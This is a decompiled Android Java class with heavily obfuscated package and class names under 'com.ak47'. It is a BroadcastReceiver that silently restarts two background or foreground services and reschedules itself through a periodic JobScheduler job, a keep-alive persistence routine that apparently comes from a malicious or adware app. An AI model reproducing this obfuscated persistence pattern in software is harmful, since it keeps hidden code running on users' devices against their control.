package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.octilmzbubuyxuwoatjjegoftxnqvqtfteebqbnaezstcjedsw5;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0044c;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class SRhfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74B extends BroadcastReceiver {
    /* renamed from: a */
    public static void m97a(Context context) {
        JobInfo.Builder builder;
        long j;
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService("jobscheduler");
        ComponentName componentName = new ComponentName(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq7_WKJ.class);
        if (Build.VERSION.SDK_INT >= 24) {
            builder = new JobInfo.Builder(100, componentName);
            j = 900000;
        } else {
            builder = new JobInfo.Builder(100, componentName);
            j = 15000;
        }
        jobScheduler.schedule(builder.setPeriodic(j).build());
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        try {
            C0045d.f188c = context.getResources().getString(C0116R.string.ptshblocky64);
            if (C0044c.m239g(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class, context)) {
                C0045d.f188c = context.getResources().getString(C0116R.string.ptshblocky64);
                context.startService(new Intent(context, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.class));
            }
            if (C0044c.m239g(oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class, context)) {
                if (Build.VERSION.SDK_INT < 26 || !C0045d.m222f()) {
                    context.startService(new Intent(context, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                } else {
                    context.startForegroundService(new Intent(context, oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.class));
                }
            }
        } catch (Exception unused) {
        }
        m97a(context);
    }
}
